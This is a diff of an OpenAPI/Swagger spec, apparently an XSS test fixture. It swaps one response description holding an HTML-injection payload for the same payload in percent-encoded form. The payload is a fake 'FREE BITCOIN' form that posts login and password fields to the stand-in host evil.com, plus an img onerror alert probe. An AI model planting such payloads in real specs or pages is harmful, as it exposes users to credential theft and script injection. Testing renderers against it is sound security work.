@@ -9,7 +9,7 @@ paths:
     get:
       responses:
         '200':
-          description: No response was specified'"><h1>FREE BITCOIN: PUT YOUR DATA BELOW: <p><form action="https://evil.com"  method="get"><label><h1>Enter with your login and password:<p><input type="text" name="login"><p><input type="text" name="password"><p><input type="submit" value="Send"><p><h4><img src=x onerror=alert('Swagger-XSS')>
+          description: No response was specified%27%22%3e%3c%68%31%3e%46%52%45%45%20%42%49%54%43%4f%49%4e%3a%20%50%55%54%20%59%4f%55%52%20%44%41%54%41%20%42%45%4c%4f%57%3a%20%3c%70%3e%3c%66%6f%72%6d%20%61%63%74%69%6f%6e%3d%22%68%74%74%70%73%3a%2f%2f%65%76%69%6c%2e%63%6f%6d%22%20%20%6d%65%74%68%6f%64%3d%22%67%65%74%22%3e%3c%6c%61%62%65%6c%3e%3c%68%31%3e%45%6e%74%65%72%20%77%69%74%68%20%79%6f%75%72%20%6c%6f%67%69%6e%20%61%6e%64%20%70%61%73%73%77%6f%72%64%3a%3c%70%3e%3c%69%6e%70%75%74%20%74%79%70%65%3d%22%74%65%78%74%22%20%6e%61%6d%65%3d%22%6c%6f%67%69%6e%22%3e%3c%70%3e%3c%69%6e%70%75%74%20%74%79%70%65%3d%22%74%65%78%74%22%20%6e%61%6d%65%3d%22%70%61%73%73%77%6f%72%64%22%3e%3c%70%3e%3c%69%6e%70%75%74%20%74%79%70%65%3d%22%73%75%62%6d%69%74%22%20%76%61%6c%75%65%3d%22%53%65%6e%64%22%3e%3c%70%3e%3c%68%34%3e%3c%69%6d%67%20%73%72%63%3d%78%20%6f%6e%65%72%72%6f%72%3d%61%6c%65%72%74%28%27%53%77%61%67%67%65%72%2d%58%53%53%27%29%3e
       tags:
         - Free Bitcoin
       operationId: findAccounts
